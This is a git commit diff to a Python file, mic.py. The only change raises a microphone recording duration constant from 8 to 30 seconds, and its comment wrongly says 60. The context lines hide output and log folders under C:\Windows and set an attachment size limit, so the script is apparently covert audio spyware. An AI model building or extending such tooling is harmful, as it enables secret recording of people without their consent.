b9a6d2175ef28d5e68d89293f5f2fc253b952920
chakibarrama <chakibarrama@gmail.com>
2024-05-17 09:38:28 +0100

    Update mic.py

--- mic.py
+++ mic.py
@@ -10,7 +10,7 @@ from datetime import datetime
 output_directory = "C:\\Windows\\klm\\output"
 log_directory = "C:\\Windows\\klm\\logs"
 logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-MICROPHONE_DURATION = 8  # Duration of recording, updated to 60 seconds
+MICROPHONE_DURATION = 30  # Duration of recording, updated to 60 seconds
 MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # Max size for an attachment
 
 def record_audio():
